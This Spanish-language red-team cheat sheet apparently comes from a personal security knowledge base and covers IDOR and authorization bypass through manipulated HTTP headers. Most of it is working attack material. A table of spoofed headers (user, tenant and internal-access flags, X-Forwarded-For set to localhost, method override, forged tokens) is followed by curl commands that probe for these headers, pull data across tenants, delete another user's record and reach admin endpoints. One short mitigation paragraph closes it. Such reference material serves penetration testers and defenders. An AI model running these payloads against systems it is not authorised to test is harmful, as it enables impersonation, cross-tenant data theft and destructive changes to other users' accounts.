---
aliases: null
tags:
  - type/technique
  - vuln/idor
  - technique/discovery
  - asset/api
  - asset/web-app
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Explotación]]'
tertiary categories:
  - '[[Web Explotación]]'
kind: SubCheatSheet
linked:
  - '[[BOLA - IDOR]]'
---
# IDOR - Manipulación de Cabeceras HTTP y Protocolo

***

## Cheatsheet

| **Header** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `X-User-Id: 106` | Backend confía en header custom → impersonation | Microservicios con auth header transitivo. |
| `X-Account-Id: 106` | Variante común en SaaS multi-account | Apps con account context en header. |
| `X-Tenant-Id: org_B` | Cross-tenant data — accedés data de otra org | SaaS multi-tenant con tenant en header. |
| `X-Forwarded-For: 127.0.0.1` | App trustea XFF para admin allowlist | Backend con IP-based admin access. |
| `X-Internal-Access: true` | Flag interna que reverse proxy "debería" stripear | Defense-in-depth fail. |
| `X-HTTP-Method-Override: PUT` en `POST /api/user/106` | Bypass de routing autz aplicado solo a PUT directo | Frameworks con method override (Symfony, Spring). |
| `Referer: https://app.com/user/106` | Backend valida autz por Referer (raro pero existe) | Apps legacy con Referer trust. |
| `Content-Type: application/xml` (en endpoint que esperaba JSON) | Parser XML con reglas autz distintas | Multi-parser backends. |
| `Authorization: Bearer <TOKEN_VICTIMA>` (token forged/leaked) | Acceso directo con identidad ajena | Combo con JWT attacks. |
| `Cookie: session=...; impersonate_id=106` | Cookie de impersonation en panel admin | Funcionalidad de "ver como usuario X". |
^idor-http

### Workflow

```bash
# 1. Header descubrimiento
curl -sI https://target/api/profile -H 'X-User-Id: 999' | head
# Si la respuesta cambia → header procesado

# 2. Tenant abuse
for tenant in org_A org_B org_internal; do
  curl -s https://target/api/data \
    -H "Authorization: Bearer $TOKEN_ORG_A" \
    -H "X-Tenant-Id: $tenant" | head -c 200
done

# 3. Method override
curl -X POST https://target/api/user/106 \
  -H 'X-HTTP-Method-Override: DELETE' \
  -H 'Cookie: session=USER_A'

# 4. XFF / Internal flag
curl https://target/api/admin/users \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -H 'X-Internal-Access: true'

# 5. Param Miner (Burp) — descubre headers ocultos
# Burp → Extender → Param Miner → "Guess headers" en endpoint target
```

### Mitigación

Reverse proxy / API gateway elimina headers internos (`X-User-Id`, `X-Forwarded-For`, `X-Internal-*`) en el border. Backend establece identidad **solo** del JWT validado, nunca del header crudo.

***
